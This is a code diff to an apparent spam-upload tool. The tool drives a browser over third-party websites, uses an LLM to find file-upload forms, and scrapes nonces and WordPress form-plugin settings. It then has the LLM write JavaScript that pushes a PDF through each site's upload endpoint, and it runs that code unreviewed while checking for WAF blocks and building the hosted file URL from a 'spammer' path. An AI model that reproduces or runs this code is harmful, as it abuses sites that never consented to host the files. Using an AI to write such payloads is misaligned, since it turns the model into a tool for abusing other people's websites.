@@ -2395,7 +2395,46 @@ class PdfUploader:
                 continue
 
         if not form_url:
-            # Crawl homepage links for form pages
+            # Use AI to suggest form page paths from homepage
+            if self._ai_key or self._oai_key:
+                try:
+                    driver.get(site_root)
+                    time.sleep(2)
+                    links_text = driver.execute_script('''
+                        return [...document.querySelectorAll('a[href]')]
+                            .map(a => a.href + ' | ' + (a.textContent || '').trim().substring(0, 50))
+                            .filter(h => h.includes(arguments[0]))
+                            .slice(0, 60).join('\\n');
+                    ''', site_root)
+                    if links_text:
+                        ai_prompt = (
+                            "Below are links from a website. Which URLs most likely lead to a page "
+                            "with a FILE UPLOAD form (e.g. submit event, apply, contact with attachment, "
+                            "upload document, registration, etc.)?\n"
+                            "Return ONLY the top 5 URLs, one per line, nothing else.\n\n"
+                            + links_text[:3000]
+                        )
+                        ai_result = self._call_ai(ai_prompt, max_tokens=512)
+                        if ai_result:
+                            for line in ai_result.strip().split('\n'):
+                                url = line.strip().split('|')[0].strip().split(' ')[0].strip()
+                                if url.startswith('http'):
+                                    try:
+                                        driver.get(url)
+                                        time.sleep(2)
+                                        has_file = driver.execute_script(
+                                            'return document.querySelector("input[type=file]") !== null'
+                                        )
+                                        if has_file:
+                                            form_url = url
+                                            break
+                                    except Exception:
+                                        continue
+                except Exception:
+                    pass
+
+        if not form_url:
+            # Fallback: crawl homepage links for form pages
             try:
                 driver.get(site_root)
                 time.sleep(2)
@@ -2427,8 +2466,140 @@ class PdfUploader:
         src = driver.page_source
         self._generic_browser_upload(driver, site_root, src, plugin)
 
+    def _ai_browser_upload(self, driver, site_root, page_src):
+        """Use AI to analyze form page and generate upload JS. Returns True if successful."""
+        if not self._ai_key and not self._oai_key:
+            return False
+
+        # Extract relevant page content (forms, scripts, inputs) — not the whole page
+        form_context = driver.execute_script('''
+            var result = {forms: [], scripts: [], inputs: [], globals: {}};
+
+            // All forms with their fields
+            document.querySelectorAll('form').forEach(function(f) {
+                var fields = [];
+                f.querySelectorAll('input, select, textarea').forEach(function(el) {
+                    fields.push({tag: el.tagName, type: el.type || '', name: el.name || '',
+                                 id: el.id || '', value: (el.type === 'hidden' ? el.value : '')});
+                });
+                result.forms.push({action: f.action || '', method: f.method || '', id: f.id || '',
+                                   enctype: f.enctype || '', fields: fields});
+            });
+
+            // File inputs outside forms
+            document.querySelectorAll('input[type=file]').forEach(function(el) {
+                result.inputs.push({name: el.name || 'file', id: el.id || '',
+                                    accept: el.accept || '', multiple: el.multiple});
+            });
+
+            // Inline scripts mentioning upload/ajax/nonce (first 500 chars each)
+            document.querySelectorAll('script').forEach(function(s) {
+                var t = s.textContent || '';
+                if (t.length > 10 && (t.includes('upload') || t.includes('ajax') ||
+                    t.includes('nonce') || t.includes('FormData') || t.includes('file'))) {
+                    result.scripts.push(t.substring(0, 800));
+                }
+            });
+
+            // Known CMS globals
+            if (typeof ajaxurl !== 'undefined') result.globals.ajaxurl = ajaxurl;
+            if (typeof nfFrontEnd !== 'undefined') result.globals.nfFrontEnd = JSON.stringify(nfFrontEnd);
+            if (typeof wpforms_settings !== 'undefined') result.globals.wpforms = JSON.stringify(wpforms_settings);
+
+            return JSON.stringify(result);
+        ''')
+
+        b64data = base64.b64encode(self.pdf_bytes).decode()
+
+        prompt = (
+            "You are analyzing a web page to upload a PDF file through its form.\n\n"
+            "TASK: Generate a JavaScript async function body that:\n"
+            "1. Creates the PDF from base64 data\n"
+            "2. Builds the correct FormData with all required fields (nonces, action names, field names)\n"
+            "3. POSTs to the correct endpoint\n"
+            "4. Returns the response\n\n"
+            "RULES:\n"
+            "- The base64 PDF data is in variable `pdfB64`\n"
+            "- The PDF filename is in variable `pdfName`\n"
+            "- You MUST return: JSON.stringify({status: resp.status, body: responseText})\n"
+            "- Use fetch(), NOT XMLHttpRequest\n"
+            "- Include ALL required hidden fields (nonces, tokens, action names)\n"
+            "- For WordPress admin-ajax, always include the 'action' field\n"
+            "- Return ONLY the JavaScript code, no explanation\n\n"
+            f"Site: {site_root}\n"
+            f"PDF filename: {self.pdf_filename}\n\n"
+            f"Page analysis:\n{form_context[:6000]}\n"
+        )
+
+        js_code = self._call_ai(prompt, max_tokens=2048)
+        if not js_code:
+            return False
+
+        # Clean up AI response — extract just the JS code
+        js_code = js_code.strip()
+        if '```' in js_code:
+            # Extract code block
+            m = re.search(r'```(?:javascript|js)?\s*\n?(.*?)```', js_code, re.DOTALL)
+            if m:
+                js_code = m.group(1).strip()
+
+        # Wrap in async IIFE with the PDF data injected
+        wrapped_js = f"""
+        return await (async () => {{
+            const pdfB64 = '{b64data}';
+            const pdfName = '{self.pdf_filename}';
+            try {{
+                {js_code}
+            }} catch(e) {{
+                return JSON.stringify({{status: 0, body: 'AI JS error: ' + e.message}});
+            }}
+        }})();
+        """
+
+        try:
+            result_str = driver.execute_script(wrapped_js)
+            res = json.loads(result_str) if result_str else {'status': 0, 'body': 'no response'}
+        except Exception as e:
+            res = {'status': 0, 'body': f'JS exec error: {e}'}
+
+        resp_text = res.get('body', '')
+        status = res.get('status', 0)
+        success = (200 <= status < 400
+                   and not self._is_waf_response(resp_text)
+                   and resp_text.strip() not in ('0', '-1', '')
+                   and any(kw in resp_text.lower() for kw in
+                           ['success', 'uploaded', '"url"', 'tmp_name', 'file_url']))
+
+        upload_url = ''
+        if success:
+            try:
+                rj = json.loads(resp_text)
+                for key in ['url', 'source_url', 'file_url', 'link', 'path']:
+                    val = rj.get(key, '')
+                    if isinstance(val, str) and val.startswith('http'):
+                        upload_url = val
+                        break
+            except Exception:
+                pass
+            # If no URL in response, construct from spammer path
+            if not upload_url:
+                info = self._parse_spammer_url()
+                upload_url = f"{site_root}{info['upload_subpath']}{self.pdf_filename}"
+
+        self.techniques.append({
+            'name': 'AI-Powered Browser Upload',
+            'http_status': status, 'success': success,
+            'response_snippet': resp_text[:500], 'upload_url': upload_url,
+        })
+        return success
+
     def _generic_browser_upload(self, driver, site_root, page_src, plugin):
         """Generic: find file input, extract all nonces/fields, upload via browser."""
+
+        # Strategy 0: AI-powered analysis (most capable)
+        if self._ai_browser_upload(driver, site_root, page_src):
+            return
+
         # Find ALL file inputs on the page
         file_inputs = driver.execute_script('''
             var inputs = document.querySelectorAll('input[type=file]');
